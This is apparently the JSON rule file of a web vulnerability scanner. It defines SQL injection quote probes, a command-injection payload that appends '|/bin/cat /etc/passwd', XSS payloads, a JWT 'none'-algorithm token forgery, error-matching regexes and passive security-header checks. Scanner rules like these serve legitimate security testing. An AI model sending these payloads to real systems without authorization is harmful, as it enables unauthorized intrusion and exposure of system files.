{
    "modules": [
        {
            "id": "sql_injection",
            "type": "active",
            "async": true,
            "metadata": {
                "module_name": "SQL Injection",
                "description": "A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.",
                "links": {
                    "OWASP": "",
                    "CWE": ""
                },
                "severity": "High",
                "unique": true,
                "regex": "(\\]\\[(DB2|ODBC|OleDb|Oracle|SqlServer|MySQL)|mysqli?_fetch_|not a valid MySQL|not a legal PLSQL identifer|mysqli?_connect\\(\\)|(SELECT\\s+[^:>]+\\sFROM\\s+[^:>]+\\sWHERE\\s+)|(at\\s[[:alnum:]\\\/\\._]+\\sline\\s\\d+)|ociparse\\(\\):|must be a syntactically valid variable|CFSQLTYPE|Unknown column ['`]|Microsoft OLE DB Provider for SQL|SQL QUERY FAILURE:|Syntax error.{1,50}in query|ORA-01722:|PostgreSQL query failed:|nested\\s+exception\\s+is\\s+com.microsoft.sqlserver.jdbc.SQLServerException|Could\\s+not\\s+find\\s+stored\\s+procedure|uncategorized\\s+SQLException\\s+for\\s+SQL|You\\s+have\\s+an\\s+error\\s+in\\s+your\\s+SQL\\s+syntax|Unclosed\\s+quotation\\s+mark|(quoted|terminated)[ \\r\\n]+.{1,100}(quoted|terminated)|sql syntax error|Syntax\\s+error\\s+in\\s+string\\s+in\\s+query\\s+expression\\s+column|Syntax error.{1,50}column|java\\.sql\\.SQLSyntaxErrorException|dao\\.EmptyResultDataAccessException|System\\.Data\\.OleDb\\.OleDbException|insert\\s+into\\s+['`][^\\s]+|database\\s+error|dberror|SqlClient.SqlException).{0,70}|call[ ]+to[ ]+a[ ]+member[ ]+function[ ]+fetch_assoc\\(\\)[ ]+.{0,100}|All[ ]+queries[ ]+combined[ ]+using[ ]+a[ ]+UNION,[ ]+INTERSECT[ ]+or[ ]+EXCEPT.{0,70}|(SQLITE_|sqlite3\\.Operational)ERROR.{0,70}"
            },
            "attacks": [
                {
                    "id": "sqlinjection_1",
                    "name": "SQL Injection - Single Quote (before)",
                    "action": {
                        "params": [
                            { "value": "'", "position": "before", "operation": "add" }
                        ]
                    },
                    "validation":{
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                },
                {
                    "id": "sqlinjection_3",
                    "name": "SQL Injection - Double Quote (before)",
                    "action": {
                        "params": [
                            { "value": "\"", "position": "before", "operation": "add" }
                        ]
                    },
                    "validation":{
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                },
                {
                    "id": "sqlinjection_2",
                    "name": "SQL Injection - Single Quote (after)",
                    "action": {
                        "params": [
                            { "value": "'", "position": "after", "operation": "add" }
                        ]
                    },
                    "validation":{
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                },
                {
                    "id": "sqlinjection_4",
                    "name": "SQL Injection - Double Quote (after)",
                    "action": {
                        "params": [
                            { "value": "\"", "position": "after", "operation": "add" }
                        ]
                    },
                    "validation":{
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                }
            ]
        },
        
        {
            "id": "os_command_injection",
            "type": "active",
            "async": true,
            "metadata":{
                "module_name": "OS command injection",
                "description": "OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.",
                "links": {
                    "OWASP": "",
                    "CWE": ""
                },
                "severity": "High",
                "unique": true
            },
            "attacks": [
                {
                    "id": "oscommand_1",
                    "name": "OS Command Injection - Unix File (cat passwd)",
                    "regex": "\\broot:.{0,20}:\\d+:\\d+:.{0,60}:|Exception: Could not find a part of the path|Exception: Could not find file",
                    "action": {
                        "params":[
                            { "value": "|/bin/cat /etc/passwd", "position": "after", "operation": "add" }
                        ]
                    },
                    "validation": {
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                }
            ]
        },
        
        
        {
            "id": "xss",
            "type": "active",
            "async": true,
            "metadata": {
                "module_name": "Cross-Site Scripting (XSS)",
                "description": "Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.",
                "links": {
                    "OWASP": "",
                    "CWE": ""
                },
                "severity": "High",
                "unique": true
            },
            "attacks": [
                {
                    "id": "xss_1",
                    "name": "XSS - Unfiltered <script> tag",
                    "regex": "<script>alert\\(ptk_xss_1\\)\\s*<\\/script>",
                    "action": {
                        "params":[
                            { "value": "<script>alert(ptk_xss_1)</script>", "position": "after", "operation": "add" }
                        ]
                    },
                    "validation": {
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                },
                {
                    "id": "xss_2",
                    "name": "XSS - Script tag after noscript tag",
                    "regex": "<\\/noscript><script>alert\\(ptk_xss_2\\)\\s*<\\/script>",
                    "action": {
                        "params":[
                            { "value": "</noscript><script>alert(ptk_xss_2)</script>",  "position": "after", "operation": "add"}
                        ]
                    },
                    "validation": {
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                },
                {
                    "id": "xss_3",
                    "name": "XSS - Svg tag with animation event",
                    "regex": "<svg><animate onbegin=alert\\(ptk_xss_3\\) attributeName=x dur=1s>",
                    "action": {
                        "params":[
                            { "value": "<svg><animate onbegin=alert(ptk_xss_3) attributeName=x dur=1s>", "position": "after", "operation": "add"}
                        ]
                    },
                    "validation": {
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                },
                {
                    "id": "xss_4",
                    "name": "XSS - Img onerror",
                    "regex": "<img src=x onerror=window.postMessage\\({\"ptk\":\"%%random%%\"}\\)>",
                    "action": {
                        "random": "%%random%%",
                        "params":[
                            {
                                "value": "<img src=x onerror=window.postMessage({\"ptk\":\"%%random%%\"})>",
                                "position": "before",
                                "operation": "add"
                            }
                        ]
                    },
                    "validation": {
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                },
                {
                    "id": "xss_5",
                    "name": "XSS - Img onerror",
                    "regex": "<img src=x onerror=window.postMessage\\({\"ptk\":\"%%random%%\"}\\)>",
                    "action": {
                        "random": "%%random%%",
                        "params": [
                            {
                                "value": "<><img src=x onerror=window.postMessage({\"ptk\":\"%%random%%\"})>",
                                "position": "before",
                                "operation": "add"
                            }
                        ]
                    },
                    "validation": {
                        "rule": {"regex" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]},
                        "proof": {"proof" : [ { "var" : "attack.response.body" }, {"var": "attack.metadata.regex"} ]}
                    }
                }
            ]
        },
        
        {
            "id": "jwt_injection",
            "type": "active",
            "async": false,
            "metadata": {
                "module_name": "JSON Web Token attacks",
                "description": "This attack occurs when an attacker alters the token and changes the hashing algorithm to indicate, through the none keyword, that the integrity of the token has already been verified",
                "links": {
                    "OWASP": "",
                    "CWE": ""
                },
                "severity": "High",
                "unique": true,
                "regex": "(eyJ[A-Za-z0-9_-]{2,})\\.([A-Za-z0-9_-]{2,})\\.([A-Za-z0-9_-]{2,})"
            },
            "attacks": [
                {
                    "id": "jwt_1",
                    "name": "JWT None Algorithm",
                    "condition": { 
                        "and" : 
                            [
                                {"==" : [ { "var" : "original.response.statusCode" }, 200 ]},
                                {"or": [
                                    {"regex" :  [ { "var" : "original.request.cookies" }, {"var": "attack.metadata.regex"} ]}, 
                                    {"regex" :  [ { "var" : "original.request.headers" }, {"var": "attack.metadata.regex"} ]}   
                                ]}
                            ] 
                    }
                    ,
                    "action": {
                        "headers": [
                            {
                                "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.$2.",
                                "regex": "(eyJ[A-Za-z0-9_-]{2,})\\.([A-Za-z0-9_-]{2,})\\.([A-Za-z0-9_-]{2,})"
                            }
                        ]
                    },
                    "validation":{ 
                        "rule": { 
                            "and" : 
                                [
                                    {"==" : [ { "var" : "attack.response.statusCode" }, 200 ]},
                                    {"==" : [ { "var" : "attack.response.body" }, { "var" : "original.response.body" } ]}
                                ] 
                        }
                    }
                 
                }
            ]
        },
        
        {
            "id": "headers",
            "type": "passive",
            "metadata": {
                "module_name": "OWASP Secure Headers",
                "description": "The OWASP Secure Headers Project describes HTTP response headers that your application can use to increase the security of your application. Once set, these HTTP response headers can restrict modern browsers from running into easily preventable vulnerabilities. ", 
                "links": {
                    "OWASP": "",
                    "CWE": ""
                }, 
                "severity": "Low",
                "unique": false
            },
            "attacks": [
                {
                    "id": "header_1",
                    "name": "Missing Content-Security-Policy header",
                    "validation": {
                        "rule": {"none" : [ {"var":"original.response.headers"}, {"in":[{"var":"name"},  ["Content-Security-Policy", "content-security-policy"]  ]} ]}
                    }
                },
                {
                    "id": "header_2",
                    "name": "Missing Strict-Transport-Security header",
                    "validation": {
                        "rule": {"none" : [ {"var":"original.response.headers"}, {"in":[{"var":"name"},  ["Strict-Transport-Security", "strict-transport-security"]  ]} ]}
                    }
                },
                {
                    "id": "header_3",
                    "name": "X-Powered-By header or equivalent",
                    "validation": {
                        "rule": {"some" : [ {"var":"original.response.headers"}, {"in":[{"var":"name"},  
                            [
                                "X-Server-Powered-By", "x-server-powered-by",
                                "X-Powered-By",  "x-powered-by",
                                "X-Powered-By-Plesk", "x-powered-by-plesk",
                                "Powered-By", "powered-by",
                                "X-Server-Powered-By","x-server-powered-by",
                                "X-Powered-CMS", "x-powered-cms",
                                "X-CF-Powered-By", "x-cf-powered-by"
                            ]  
                            ]} ]
                        }
                    }
                },
                {
                    "id": "header_4",
                    "name": "X-Frame-Options header is an obsolete directive",
                    "validation": {
                        "rule": {"some" : [ {"var":"original.response.headers"}, {"in":[{"var":"name"},  
                            [
                                "X-Frame-Options", "x-frame-options"
                            ]  ]} ]
                        }
                    }
                },
                {
                    "id": "header_5",
                    "name": "X-XSS-Protection header is an obsolete directive",
                    "validation": {
                        "rule": {"some" : [ {"var":"original.response.headers"}, {"in":[{"var":"name"},  
                            [
                                "X-XSS-Protection", "x-xss-protection"
                            ]  ]} ]
                        }
                    }
                }
        
            ]
        }
    ]
}